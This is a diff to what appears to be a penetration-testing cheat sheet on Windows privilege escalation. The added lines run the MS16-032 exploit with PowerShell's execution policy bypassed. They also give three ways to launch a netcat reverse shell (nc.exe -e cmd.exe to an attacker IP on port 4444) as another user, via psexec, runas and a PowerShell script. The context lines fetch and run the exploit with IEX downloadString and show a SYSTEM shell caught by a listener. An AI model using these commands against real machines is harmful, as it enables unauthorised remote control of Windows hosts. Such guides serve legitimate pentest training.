@@ -261,6 +261,10 @@ Or from a Windows Powershell:
 ```powershell
 IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
 ```
+Or if you wanted to upload the exploit, you can always run it like this:
+```powershell
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+```
 On our Kali machine we create the reverse shell and ... BOOM! Root dance.
 ```
 root@kali:~# nc -nlvp 4444
@@ -269,6 +273,38 @@ connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182
 
 PS C:\Users\jimmy^> whoami
 nt authority\system
+```
+
+## Windows Run As
+Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.
+
+Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
+
+```cmd
+ C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
+ PsExec v2.2 - Execute processes remotely
+ Copyright (C) 2001-2016 Mark Russinovich
+ Sysinternals - www.sysinternals.com
+ ```
+ 
+Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+```cmd
+ C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
+ Enter the password for Test:
+ Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
+```
+
+PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
+```powershell
+ $username = '<username here>'
+ $password = '<password here>'
+ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+ $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+ Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+```
+Next run this script using powershell.exe:
+```powershell
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
 
 *Easy*
